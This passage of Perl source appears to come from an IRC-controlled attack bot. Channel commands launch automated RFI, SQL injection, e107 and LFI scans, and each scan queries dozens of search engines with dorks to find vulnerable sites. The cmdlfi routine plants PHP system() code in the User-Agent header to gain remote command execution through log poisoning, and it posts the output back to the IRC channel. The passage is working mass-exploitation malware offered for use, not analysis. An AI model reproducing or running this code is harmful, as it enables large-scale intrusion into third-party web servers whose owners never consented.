        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "ALtaViSTa";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### ASK Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AsK";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### UoL Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "UoL";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Yahoo Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "YahOo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Lycos Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Lycos";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Good search Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "GoodSearch";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Onet engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Onet";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Seznam Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SeznaM";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### NetI Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "NetI";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### DiNo Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "DiNo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### WitcH Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "WitcH";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### IlsE Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "IlsE";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### SnZ Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SnZ";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### SapO Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SapO";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### gigablast Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "gigablast";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### tiscali Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "tiscali";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Libero Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "libero";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### ixquic Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "ixquic";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### kvasir Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "kvasir";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### szukacz Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "szukacz";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### virgillio Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "virgillio";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### aol Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "aol";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		
		
		#####################################################################
        #####################         SQL SQL SQL         ###################
        ##################################################################### GooGle Engine		
		
		if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "GooGLe";
                    my $bugx = $1;
                    my $d0rk = $2;
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9SQL4)8 Loading scanner ,9 24 engine !!!");
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### AllTheWeb Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AllTheWeb";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Bing Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Bing";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Altavista Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "ALtaViSTa";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### ASK Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AsK";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### UoL Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "UoL";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Yahoo Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "YahOo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Lycos Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Lycos";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Good search Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "GoodSearch";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Onet engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Onet";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Seznam Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SeznaM";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### NetI Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "NetI";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### DiNo Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "DiNo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### WitcH Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "WitcH";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### IlsE Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "IlsE";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### SnZ Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SnZ";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### SapO Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SapO";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### gigablast Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "gigablast";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### tiscali Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "tiscali";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Libero Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "libero";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### ixquic Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "ixquic";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### kvasir Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "kvasir";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### szukacz Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "szukacz";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### virgillio Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "virgillio";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### aol Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "aol";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		#####################################################################
        #####################       e107 e107 e107        ###################
        ##################################################################### GooGle Engine		
		if ($msg=~ /PRIVMSG $channel :$cmde107\s+(.*?)\s+(.*)/){
			my $url = $1;
			my $cmd = $2;
			&cmde107($url,$cmd);
		}
		if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "GooGLe";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9e1074)8 Ok Brother,9 loading . . . please wait !!!");
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### AllTheWeb Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AllTheWeb";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Bing Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Bing";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Altavista Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "ALtaViSTa";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### ASK Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AsK";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### UoL Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "UoL";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Yahoo Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "YahOo";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Lycos Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Lycos";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Good search Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "GoodSearch";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Onet engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Onet";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Seznam Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SeznaM";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### NetI Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "NetI";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### DiNo Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "DiNo";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### WitcH Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "WitcH";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### IlsE Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "IlsE";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### SnZ Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SnZ";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### SapO Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SapO";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### gigablast Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "gigablast";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### tiscali Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "tiscali";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Libero Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "libero";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### ixquic Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "ixquic";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### kvasir Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "kvasir";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### szukacz Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "szukacz";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### virgillio Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "virgillio";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### aol Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "aol";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line=$line_temp.$line if ($line_temp);
            $line_temp='';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
                parse("$line");
            } else {
                if ($#lines == 0) {
                    parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}
##################################################################### Procedure
sub cmdlfi() {
my $browser = LWP::UserAgent->new;
my $url = $_[0];
my $cmd = $_[1];
my $hie = "j13mbut<?system(\"$cmd 2> /dev/stdout\"); ?>j13mbut";
$browser->agent("$hie");
$browser->timeout(3);
$response = $browser->get( $url );
if ($response->content =~ /j13mbut(.*)j13mbut/s) {
print $1;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3LFICMD15)4 $1");
}
}

sub lfiscan() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /GooGLe/) {
        my @lfigoogle=&google($dork);
        push(@lfitotal, @lfigoogle);
        }
    if ($engz =~ /AllTheWeb/) {
        my @lfialltheweb=&alltheweb($dork);
        push(@lfitotal, @lfialltheweb);
    }
    if ($engz =~ /Bing/) {
        my @lfiBing=&Bing($dork);
        push(@lfitotal, @lfiBing);
    }
    if ($engz =~ /ALtaViSTa/) {
        my @lfialtavista=&altavista($dork);
        push(@lfitotal, @lfialtavista);
    }
    if ($engz =~ /AsK/) {
        my @lfiask=&ask($dork);
        push(@lfitotal, @lfiask);
    }
    if ($engz =~ /UoL/) {
        my @lfiuol=&uol($dork);
        push(@lfitotal, @lfiuol);
    }
    if ($engz =~ /YahOo/) {
        my @lfiyahoo=&yahoo($dork);
        push(@lfitotal, @lfiyahoo);
    }
	if ($engz =~ /Lycos/) {
        my @lfilycos=&lycos($dork);
        push(@lfitotal, @lfilycos);
    }
	if ($engz =~ /GoodSearch/) {
        my @lfigoodsearch=&goodsearch($dork);
        push(@lfitotal, @lfigoodsearch);
    }
	if ($engz =~ /Onet/) {
        my @lfionet=&onet($dork);
        push(@lfitotal, @lfionet);
    }
    if ($engz =~ /SeznaM/) {
        my @lfiseznam=&seznam($dork);
        push(@lfitotal, @lfiseznam);
    }
	if ($engz =~ /Neti/) {
        my @lfineti=&neti($dork);
        push(@lfitotal, @lfineti);
    }
    if ($engz =~ /DiNo/) {
        my @lfidino=&dino($dork);
        push(@lfitotal, @lfidino);
    }
	if ($engz =~ /WitcH/) {
        my @lfiwitch=&witch($dork);
        push(@lfitotal, @lfiwitch);
    }
    if ($engz =~ /IlsE/) {
        my @lfiilse=&ilse($dork);
        push(@lfitotal, @lfiilse);
    }
	if ($engz =~ /snz/) {
